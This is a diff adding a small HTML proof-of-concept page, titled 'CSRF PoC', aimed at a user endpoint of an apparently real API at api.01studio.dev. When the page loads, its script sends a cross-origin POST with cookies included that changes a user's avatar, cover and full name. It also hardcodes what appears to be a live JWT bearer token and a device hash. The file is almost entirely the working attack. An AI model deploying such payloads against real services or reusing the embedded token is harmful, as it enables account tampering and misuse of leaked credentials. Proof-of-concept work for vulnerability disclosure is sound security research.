@@ -1,0 +1,23 @@
+<html>
+  <body>
+    <h1>CSRF PoC</h1>
+    <script>
+      fetch("https://api.01studio.dev/v2/users/63228910-2466-4b12-9a27-b7eb47e6911c", {
+        method: "POST",
+        mode: "cors",
+        credentials: "include", // send cookies if they exist
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzIyODkxMC0yNDY2LTRiMTItOWEyNy1iN2ViNDdlNjkxMWMiLCJsZXZlbCI6MywiaWF0IjoxNzU0NTgyODY1LCJleHAiOjE3NTU3OTI0NjV9.5K-0lQOwju7Cp18XlzRnJQXbVvO236jXdlSVt_AdLDM",
+          "X-Device-Hash": "3302027e1075e7ac723a074c398215cd"
+        },
+        body: JSON.stringify({
+          "avatar": "00d922b8-33b5-4e77-8bb2-e412119fb716",
+          "cover": "46975add-12c0-4059-b03e-4b0b56e06a56",
+          "fullName": "codruSparroww",
+          "hasComment": true
+        })
+      });
+    </script>
+  </body>
+</html>
